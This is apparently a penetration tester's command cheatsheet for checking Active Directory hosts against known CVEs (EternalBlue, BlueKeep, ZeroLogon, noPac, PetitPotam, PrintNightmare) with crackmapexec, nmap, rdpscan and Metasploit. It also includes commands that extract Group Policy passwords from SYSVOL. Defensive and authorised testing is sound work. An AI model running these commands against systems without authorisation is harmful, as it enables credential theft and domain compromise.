# CVE

## Check & Exploit GPP SYSVOL (MS14-025) - cme

```
cme smb <domain-controller> -u <user> -p '<password>' -d <domain> -M gpp_password
```

= domain-controller: $DOMAIN_CONTROLLER
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check & Exloit GPP SYSVOL (MS14-025) - msf

```
msfconsole -x "use scanner/smb/smb_enum_gpp"
```

## Check SMB vulnerabilities

```
nmap -Pn --script smb-vuln* -p139,445 <target>
```

= target: ./targets/domain/computers.txt

## Check Eternal Blue (MS17-010) - cme

```
cme smb <target> -M ms17
```

= target: ./targets/domain/computers.txt

## Check BlueKeep (CVE-2019-0708)

```
rdpscan <target>
```

= target: ./targets/domain/computers.txt

## Check Eternal Blue (MS17-010) - nmap

```
nmap -Pn --script smb-vuln-ms17-010 -p139,445 <target>
```

= target: ./targets/domain/computers.txt

## Check Zero Logon (CVE-2020-1472)

```
cme smb <domain-controller> -M zerologon
```

= domain-controller: $DOMAIN_CONTROLLER

## Check noPac (CVE-2021-42278 and CVE-2021-42287)

```
cme smb <domain-controller> -u <user> -p '<password>' -d <domain> -M nopac
```

= domain-controller: DOMAIN_CONTROLLER
= user: ${USER}
= password: ${PASSWORD}
= domain: ${DOMAIN}

## Check PetitPotam (CVE-2021-36942)

```
cme smb <domain-controller> -u <user> -p '<password>' -d <domain> -M petitpotam
```

= domain-controller: $DOMAIN_CONTROLLER
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN

## Check Print Nightmare (CVE-2021-34527)

```
docker run -it itwasalladream -u <user> -p '<password>' -d domain> <target>
```

= domain-controller: $DOMAIN_CONTROLLER
= user: $USER
= password: $PASSWORD
= domain: $DOMAIN
= target: ./targets/domain/computers.txt